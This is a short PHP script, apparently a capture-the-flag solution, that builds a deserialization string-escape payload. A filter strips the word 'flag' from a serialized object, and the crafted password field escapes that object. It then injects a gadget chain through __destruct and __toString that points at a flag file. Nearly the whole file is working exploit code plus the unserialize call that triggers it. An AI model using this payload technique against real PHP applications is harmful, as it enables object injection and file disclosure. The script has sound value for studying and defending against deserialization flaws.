<?php
class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        return $this->c;
    }
}

class A
{
    public $username;
    public $password;

    public function __construct($username, $password){
        $this->username = $username;
        $this->password = $password;
    }

}

function filter_nohack($data) {
    return str_replace('flag', '', $data);

}
$username = "flagflagflagflagflagflag";//24个\\0
$password = "A";
$payload = '";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flflagag.php";}}'; 
$shellcode=$password.$payload;
echo serialize(new A($username, $shellcode));
echo "\n";
echo "\n";
echo filter_nohack(serialize(new A($username, $shellcode)));
unserialize(filter_nohack(serialize(new A($username, $shellcode))));